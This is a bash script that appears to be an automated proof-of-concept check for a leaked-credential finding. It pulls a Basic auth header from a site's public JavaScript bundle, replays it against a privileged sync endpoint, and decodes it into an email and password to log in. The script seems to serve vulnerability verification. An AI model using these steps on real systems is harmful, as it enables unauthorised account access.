#!/usr/bin/env bash
# CREDS-BUNDLE-001 (CWE-522/CWE-798): live service-account credentials are baked
# into the browser bundle as a pre-encoded Basic auth header. Harvest the header
# out of the public chunk, then prove it is a working privileged credential —
# both replayed as-is and decoded back into email/password.
set -e; . "$(dirname "$0")/_lib.sh"

# 1. Harvest a Basic credential from the public bundle (nothing hardcoded here).
CRED=$(bundle_text /integrations | grep -o 'Basic [A-Za-z0-9+/]\{8,\}=*' | head -1)
[ -n "$CRED" ]

# 2. Replay it: the service account authenticates without any session.
curl -s -X POST "$TARGET/api/integrations/sync" -H "authorization: $CRED" \
  | grep -q '"ok":true'

# 3. Decode it and log in outright — it is a real account, not an opaque token.
PAIR=$(b64dec "${CRED#Basic }")
EMAIL="${PAIR%%:*}"; PASS="${PAIR#*:}"
curl -s -X POST "$TARGET/api/auth/login" -H 'content-type: application/json' \
  -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" | grep -q '"ok":true'
